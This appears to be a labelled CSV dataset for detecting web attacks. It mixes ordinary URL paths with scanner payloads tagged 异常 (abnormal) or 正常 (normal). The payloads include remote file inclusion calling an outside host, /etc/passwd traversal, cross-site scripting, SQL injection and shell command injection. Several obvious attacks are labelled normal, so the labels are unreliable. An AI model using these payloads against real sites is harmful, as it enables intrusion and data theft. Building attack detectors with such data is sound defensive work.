label,content
异常,/script_path/installation/index.php?mosconfig_absolute_path=http://192.168.202.118:8080/moclyxlwqyfjnp??
异常,/jdx255ea.jspa?<meta http-equiv=set-cookie content="testziyq=5055">
正常,/javascript/portal.temp
正常,/045163/
正常,/microsoft office 2000 premium final/
正常,/javascript/eu.rtf
正常,/system/login.php?site_path=http://192.168.202.118:8080/tzhfyzkbomspvm?
正常,/142728/
正常,/dotrar/
正常,/construction equipment equipment heavy trailer/
正常,/coldfusion_double_encoded_null_info_disclosure-1331999823.asp%00.cfm
正常,/logitech g5/
正常,/p2p.cgi
异常,%2522%7C%20%5B%205%20-ne%20%24%28echo%20CROOYG%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%255C%255C
正常,/digitalaudioplayers/
正常,/dental disc 3 kaplan nbd/
正常,/30690874_75/
正常,/2100289053/
正常,/please save my earth image soundtrack vol/
正常,/what does it take to build a good business continuity plan/
正常,/4safeinternet-com/
正常,/ndayotex/
异常,/components/com_extcalendar/admin_events.php?CONFIG_EXT[LANGUAGES_DIR]=XXpathXX
异常,/msadc/..\xc0%9v..\xc0%9v..\xc0%9v..\xc0%9v..\xc0%9v../winnt/system32/cmd.exe?/c+dir+c:\+/og
异常,/20330/e/data/ecmseditor/infoeditor/epage/TranImg.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
正常,/javascript/property.cgi
正常,/javascript/poc.old
异常,/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://192.168.202.118:8080/tzhfyzkbomspvm?
异常,/examples/servlets/servlet/search.pl?form=../../../../../../etc/passwd\x00
正常,/javascript/x.cc
异常,/scripts/onwkbtts3uj1.pl
异常,/cgibin/ustorekeeper.pl?command=goto&file=../../../../../../../../../../etc/passwd
异常,%2527%7C%20%5B%202%20-ne%20%24%28echo%20RHGVTL%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%255C%255C
正常,/wasteland_screenshot/
正常,/javascript/h.class
正常,/shapingbar/
异常,%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%
异常,<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
异常,%22%7C%20%5B%206%20-ne%20%24%28echo%20EUILIT%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%27
正常,/javascript/blah.mdb
正常,/right_news/
正常,/weeinconvenienttruthtitle/
正常,/162098/
异常,/cacti/ncbook/ncbook.cgi?action=default&current=|cat /etc/passwd|&form_tid=996604045&prev=main.html&list_message_index=10
正常,/wwwcount255/
正常,/piro88x31/
正常,/depouilg.php3?nomvote=http://192.168.202.118:8080/tzhfyzkbomspvm??
异常,%26%26echo%20KEKCUX$((55%2B27))$(echo%20KEKCUX)KEKCUX%22
正常,/securityupdate2005007v11macosx1042client/
正常,/6_littleimportance/
异常,ORDER BY 10 
异常,/?408=%20onchange=alert(1)
正常,/fid95262815cadddcdb0b4a90a56e6ad4b96e0cdae2/
正常,/arpanet4_small/
正常,/baja-250/
异常,"/help.php?q=""rm,q11574297&rem,"
异常,ABC<div style="x:\xE2\x80\x81expression(javascript:alert(1)">DEF
正常,/marley_thumb/
正常,/tbl2hdr_divleft/
异常,%22&echo%20IRYPDI$((16%2B41))$(echo%20IRYPDI)IRYPDI
正常,/dietguides_info/
异常,/modules/events/index.php?full_path=XXpathXX
异常,/odzk29aa.cfm?<meta http-equiv=set-cookie content="testtfvh=2141">
异常,/cgi/view_item?html_file=../../../../../../../../../../etc/passwd\x00
正常,/130263/
正常,/tt0051207/
异常,/main.php?stuff="ver&rem\x0c
异常,/phpmyadmin/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1332008637')</script>
正常,/1859324475/
正常,/293137/
正常,/services_marketing/
异常,/odzk29aa.mscgi?<script>document.cookie="testtfvh=2141;"</script>
正常,/s_0294c833a9ae969b4625a466008c132a/
异常,/scripts/index.asp
异常,/hipkz026.jsp?<meta http-equiv=set-cookie content="testyrbs=2855">
异常,/lib/db/postgres.class.php?root=XXpathXX
正常,/javascript/phone.jar
正常,/gilmore v  gozales rcfp_asne amicus/
正常,/javascript/certificates.inc
异常,AND 1=0
异常,/supporter/index.php?t=ticketfiles&id=&lt;script&gt;<script>alert('vulnerable')</script>&lt;/script&gt;
正常,/7517426/
异常,%0A%20str%3D%24%28echo%20IEZSHQ%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522
正常,/102025/
异常,/2013/?"onmouseover='prompt(42873)'bad=">
异常,print(`echo%20DYZZIW;echo%20$((94%2B81));echo%20DYZZIW;echo%20DYZZIW`)%3B%2523DYZZIW
异常,/scripts/news.scr.php?globals[pth][classes]=http://192.168.202.118:8080/zz5thkvtmlgl??
正常,/javascript/usa.cgi
正常,/pda/pda_projects.php?offset=http://192.168.202.118:8080/moclyxlwqyfjnp?
正常,/144830/
异常,<IMG SRC="jav    ascript:javascript:alert(1);">
正常,/web/betablockmodules/messagemodule/messagemodule.php?path_prefix=@rfiurl
异常,%2522%7C%20%5B%206%20-ne%20%24%28echo%20ZDDHYL%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%23
异常,%22%3B%20str%3D%24%28echo%20WBDHXY%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%23
正常,/bittorrent_524386/
正常,/examples/jsp/sessions/remotehtmlview.php?phpads_path=http://xxxxxxxx
正常,/044522/
正常,/fidc46c6710b5e56dc01cf3e7ff0662e8837c9db286/
异常,/DFF_PHP_FrameworkAPI-latest/include/DFF_paging.func.php?DFF_config[dir_include]=XXpathXX
正常,/gatsbysamericandream/
正常,/javascript/chat.trace
正常,/examples/jsp/jsp2/jspx/textrotate.jspx.html
异常,/top.php?stuff=';uname >q64815511 #
正常,/160029/
异常,/scripts/search.php
异常,/modules/vwar/convert/mvcw_conver.php?step=1&vwar_root=XXpathXX
异常,/yef5f3d5.x?<meta http-equiv=set-cookie content="testcrcv=6167">
异常,%27%7C%20%5B%208%20-ne%20%24%28echo%20TYMEOG%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20//
正常,/newstodo/
异常,/..%5c{FILE}
正常,/js-bus1/
正常,/area_gazzetta/
正常,/ipodzone-promo/
正常,/dictionary of info sec cover-758451/
正常,/zealot avi to vcd svcd dvd converter v1/
正常,/grupo sp elite 2006 [programas][spanish][www/
正常,/holidaydecor_p24/
正常,/47cfr59/
异常,/169okeyj.mscgi?<script>document.cookie="testxeoi=3573;"</script>
正常,/accwhizz/
正常,/ibm-107/
正常,/ballot_act/
异常,/modules/article/bookcase.php/member/index.php
正常,/administrator/components/com_chronocontact/excelwriter/writer/format.php?mosconfig_absolute_path=http://192.168.202.118:8080/ghl9il??
正常,/557179874/
异常,%27&&echo%20EFAUWG$((53%2B25))$(echo%20EFAUWG)EFAUWG%7C
正常,/mysave.php?file=http://192.168.202.118:8080/tzhfyzkbomspvm?
正常,/includes/morcegocms/adodb/adodb.inc.php?path=@rfiurl
正常,/kinderfiets/
异常,/examples/jsp/num/more.php?id=1'
正常,/000026608/
正常,/768095/
正常,/general advertising inquiries_feb06/
异常,%22%7C%7Cecho%20IVDYQE$((21%2B54))$(echo%20IVDYQE)IVDYQE%5C%5C
正常,/help.php?q=|ping\xa0-w\xa07000\xa0-n\xa01\xa01.2.3.4|rem\xa0
正常,/toolbox/
正常,/mig-23/
正常,/ealert63/
正常,/125905/
正常,/someunexistantstuff15062188971114999178.html
异常,/606wkcop.cfc?<img src="javascript:alert(cross_site_scripting.nasl);">
异常,/examples/jsp/error/ncbook.cgi?action=default&current=|cat /etc/passwd|&form_tid=996604045&prev=main.html&list_message_index=10
正常,/politoys/
正常,/examples/jsp/colors/gallery/displaycategory.php?basepath=http://xxxxxxxx
异常,/ydexw8by.fts?<meta http-equiv=set-cookie content="testulex=4996">
正常,/javascript/todo.yml
正常,/main.php?logout=\x0arm\x09q12532116\x09#
异常,//<body><script src=http://www.example.com/test?rnd=q77447371></script>
异常,/en-us/odzk29aa.kspx?<meta http-equiv=set-cookie content="testtfvh=2141">
异常,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--"
正常,/flickritis/
异常,"""||echo$IFSYDFXUN$((70%2B11))$(echo$IFSYDFXUN)YDFXUN"
异常,/ddoworrl.jsp?<meta http-equiv=set-cookie content="testvlau=8517">
异常,%3Cdiv%20style%3Dposition%3Afixed%3Btop%3A0px%3Bleft%3A0px%3Bbackground%2Dcolor%3A%23FFFFFF%3Bwidth%3A100%25%3Bheight%3A100%25%3Btext%2Dalign%3Acenter%3Bz%2Dindex%3A11%3B%20%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Ca%20href%3D%3Fxss%3D%253Cscript%2520src%253D%252F%252Fxy%252Ehn%252Fa%252Ejs%2520%253E%253C%252Fscript%253E%3EThe%20requested%20page%20has%20moved%20here%3C%2Fa%3E%3C%2Fdiv%3E
正常,/000099327/
正常,/jajah-hype/
正常,/20031021-14/
正常,/dj tiesto - best and new 2005/
正常,/gaming-hardware/
异常,/scgi-bin/fileseek.cgi?foot=;cat /etc/passwd&head=
异常,/examples/jsp/cal/admin/components/com_fm/fm.install.php?lm_absolute_path=../../../&install_dir=limbo_com_fm_php_shell.nasl-1331904434
正常,/javascript/prop.lib
正常,/tn_1436/
异常,""");}print(`echo%20TWEYRU;echo%20$((57%2B60));echo%20TWEYRU;echo%20TWEYRU`)%3BTWEYRU"
正常,/3088022/
正常,/crusader- no remorse/
正常,/javascript/sink.xsl
异常,/l'inferno_(1911)/
异常,/examples/jsp/colors/login.php?lang=/../../../../../../../../../../../../etc/passwd\x00
异常,"/scripts/index.php?op=viewalbum&albumid=-1/**/union/**/select/**/0,1,1126849470,1437216392,1,1,1,1,1--&blogid=1"
正常,/20061120-newsletter/
正常,/okroshka1165605801i7488iz9/
正常,/supafly/
异常,/phpmyadmin/../phpmyadmin.zip
异常,<SCRIPT SRC=http://xss.rocks/xss.js?< B >
异常,/75/user.php?back_act=http://127.0.0.1%22style=x:expression(alert(42873))%3E
正常,/blandy/
正常,/seka - inside seka/
正常,/pag-220/
异常,%7C%20%5B%206%20-ne%20%24%28echo%20ANNQCK%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20
正常,/web-console/
异常,/cgi-bin/uploader.exe
正常,/javascript/outline.nsf
正常,/boys_w0qqfromzr4qqsacategoryz11452qqsocmdzlistingitemlist/
正常,/biometrics deployment of machine readable travel documents 2004/
异常,/javascript/services.exe
正常,/000123318/
异常,/scripts/awstats.pl
异常,/help.php?q=uname >q93421292 #
异常,<form><button formaction=javascript&colon;alert(1)>CLICKME
异常,<IMG SRC=`javascript:javascript:alert(1)`>
正常,/linksys wrt54g/
正常,/lib/classes/swift/bytestream/c99shell.php
正常,/idealo_left/
正常,/crack_nexus terminal 5/
正常,/039305/
正常,/cool-edit/
异常,/oie504mr.exe?<script>document.cookie="testtpby=7052;"</script>
异常,/manager/static/view.php?propID=0&INC=XXpathXX
正常,/sl-2725/
正常,/536511/
异常,/examples/jsp/num/index.php?search=<script>foo</script>
正常,/d06542thigh/
正常,/038331/
正常,/2265258/
正常,/include/urights.php?crm_inc=http://192.168.202.118:8080/tzhfyzkbomspvm?
异常,/cleartrust/ct_logon.asp?ctauthmode=basic&ctloginerrormsg=xx&ct_orig_uri=\">< script>alert(1)/script><\"
正常,/index_46/
正常,/htforum/
异常,><script>alert(123);</script x=
正常,/ashleyangel/
异常,&#X03c
异常,%2527%3B%20str%3D%24%28echo%20UEOOZQ%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2522
异常,/en-us/dda2qr7j.do?<script>cross_site_scripting.nasl</script>
异常,/examples/jsp/error/newsdesk.cgi?t=../../../../../../etc/passwd
正常,/cl_car/
正常,/examples/jsp/checkbox/tinfo.php?id=1331904406
异常,"</title><frameset><frame src=""data:text/html,<script>confirm(1)</script>"">"
异常,%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ITUCTB%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20
正常,/131437/
正常,/epsilon_award2006small/
异常,/javascript/thumbnail.exe
异常,/0z575z74.dll?<meta http-equiv=set-cookie content="testuhsv=9753">
正常,/39057501/
正常,/contaceptive/
正常,/examples/jsp/colors/wsisa.dll/wservice=wsbroker1/webtools/oscommand.w
异常,case when name=0x5265696E657273 then 1 else 0 end
异常,/scripts/index.php?template=../../../loudblog/custom/config.php\x00
异常,${system(print(`echo%20EZFNSE;echo%20$((38%2B74));echo%20EZFNSE;echo%20EZFNSE`)%3B%2529%257DEZFNSE
异常,/cgi-bin/webmail/html/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd\x00
异常,/...\...\...\...\...\...\...\...\{FILE}
正常,/10595_32/
异常,<a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>
正常,/header_onstage/
正常,/800-intro/
正常,/185315/
异常,/store.php?crn=42'&action=show&show_products_mode=cat_click
异常,/phpmyadmin/index.php?site=../../../../../../../../etc/passwd\x00
正常,/examples/jsp/error/index.php?board=nonexistant421003528
正常,/chapt-4/
异常,<svg><script>alert&grave;1&grave;<p>
正常,/mightyfax_3/
正常,/phpmyadmin/documentation.html?phpmyadmin=jyi=
正常,/core/archive_cat.php?absoluteurlhttp://192.168.202.96:8080/swgnhpydbq0t?
异常,/phpmyadmin/webplus?script=/../../../../etc/passwd
异常,/%22/api.php?op=map&maptype=1&defaultcity=%e5%22;alert%28/42873/%29;//
异常,/moodle/filter/tex/texed.php?formdata=foo&pathname=foo"+||+echo+db+5e+30+00+00+00+00+00+00+4b+45+52+4e+45+4c+33+32+2e+64+6c+6c+00+00+00+00+4c++>>esbq
正常,/javascript/body.out
异常,/web/help.php?LIBSDIR=XXpathXX
异常,/en-us/account/www/delivery/fc.php?max_type=../../../../../../../../../../etc/passwd\x00
正常,/javascript/helpers.dat
正常,/itdf 2325 digital forensic tools-learning activity/
正常,/very hot teen asian lesbians making out at a birthday party/
正常,/q7vd3c0xzwi/
正常,/content/modify_go.php?pwfile=@rfiurl
正常,/phpmyadmin/ui/login?user=nessus-1331904327
正常,/mao_zedong/
正常,/microsoft windows vista serial number/
异常,%3Becho%20GBWBWQ$((60%2B85))$(echo%20GBWBWQ)GBWBWQ%7C
异常,/cgi-bin/cvsqueryform.cgi?cvsroot=/cvsroot&module=<script>alert('vulnerable')</script>&branch=head
异常,/subscriptions.properties
正常,/430716/
正常,/addsite.php?returnpath=http://192.168.202.96:8080/llumt7msyau5y?
异常,1)) and pg_sleep(50)--
正常,/cinelerra_changelog/
正常,/rfcc-5269/
正常,/examples/jsp/colors/printfaq.php?lng=en&pg=1
正常,/d8lmsb9g1/
正常,/examples/jsp/jsp2/el/functions.jsp.1
异常,/javascript/goaway.exe
异常,/examples/jsp/jsp2/jspx/index.php?show=/etc/passwd
异常,/examples/jsp/jsp2/el/index.php?id='
正常,/inventeurfou/
异常,/postscripttutorial/
正常,/en-us/static/@95063/img/skins/default/logo-mrsparkle.png
正常,/ktmlpro/includes/ktedit/toolbar.php?dirdepth=http://cirt.net/rfiinc.txt?
异常,/javascript/default.exe
正常,/m110630/
正常,/20030608/
异常,/mailpasswd/
正常,/rdf-pics/
异常,/examples/jsp/sessions/docs/index.php?lang=/../../../../../../../../../../etc/passwd\x00
正常,/gts2006-2007/
正常,/peterb/
正常,/bp_news.php?bnrep=http://192.168.202.96:8080/whmch8ftkt7kv?
异常,%26%20sleep%200%20%26%26%20str%3D%24%28echo%20UIVPGT%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%204%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2526
正常,/0725051xmas1/
正常,/sinkmyship/
异常,/examples/jsp/numsearch-results.dot?search_query=nessus"><script>alert('dotcms_search_query_xss.nasl')</script>/
正常,/home_sm/
异常,</script><script >alert(document.cookie)</script>
正常,/monitores_tft/
正常,/sw/lib_up_file/file.php?doc_directory=@rfiurl?doc_directory=@rfiurl?
正常,/treewm-0/
正常,/q74671245
异常,/cgi-bin/pjreview_neo.cgi?p=../../../../../../../../../../etc/passwd
异常,<link rel="import" href="data:text/html&comma;&lt;script&gt;alert(document.domain)&lt ;&sol;script&gt;
正常,/generalhackits/
正常,/156614/
异常,/javascript/sessions.exe
正常,/nosuchfile-394279534-1207886861.jsp
正常,/101255/
正常,/karaoke revolution complete live song pack/
正常,/sowcomprehensiveassessmentofdodhumanfactorsanalysismethodologies/
正常,/90757-chi/
异常,/modules/Calendar/scheme.php?calpath=XXpathXX?
正常,/forum_ubb/
异常,/javascript/live.exe
异常,function makePopups(){
异常,%0aecho%20TFYSCR$((64%2B58))$(echo%20TFYSCR)TFYSCR|
异常,1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(1)&gt;`>
正常,/003844/
异常,/phpmyadmin/jgs_portal_statistik.php?meinaction=themen&month=1&year=1'
正常,/p1050579/
正常,/girlsgonewild - high school girls strip for me/
正常,/spydersoft/
正常,/findix/index.php?page=http://192.168.202.118:8080/moclyxlwqyfjnp??&cmd=id
正常,/examples/jsp/error/view.php?pg=foobar
正常,/menu.php?functions_file=http://cirt.net/rfiinc.txt?
异常,/jujgxwav.mscgi?<meta http-equiv=set-cookie content="testknim=9383">
正常,/2612020/
正常,/javascript/contacts.sh
正常,/lib/classes/swift/outputbytestream.php.copy
异常,/scripts/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name= ;id; 
正常,/classes/tech_o.php?absolutepath=http://192.168.202.118:8080/zz5thkvtmlgl?
异常,/cgi-bin/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1332008327')</script>
正常,/armarillo/
异常,"/5_5164/connect.php?receive=yes&mod=login&op=callback&referer=webscan%bf%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//"
正常,/javascript/portal.tar.bz2
正常,/javascript/baz.do
